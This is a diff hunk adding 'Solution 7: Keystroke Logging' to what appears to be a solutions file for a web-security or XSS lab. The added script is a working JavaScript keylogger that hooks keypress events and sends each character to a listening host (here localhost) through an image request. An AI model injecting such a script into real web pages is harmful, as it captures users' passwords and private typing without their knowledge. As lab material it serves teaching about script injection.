@@ -88,4 +88,13 @@ document.body.addEventListener('click', CaughtClick, true);
 
 * Solution 7: Keystroke Logging
 
+<script>
+	
+document.onkeypress = function KeyLogger(inp)
 
+{
+	key_pressed = String.fromCharCode(inp.which);
+	new Image().src = "http://localhost/?" + key_pressed
+}
+	
+</script>
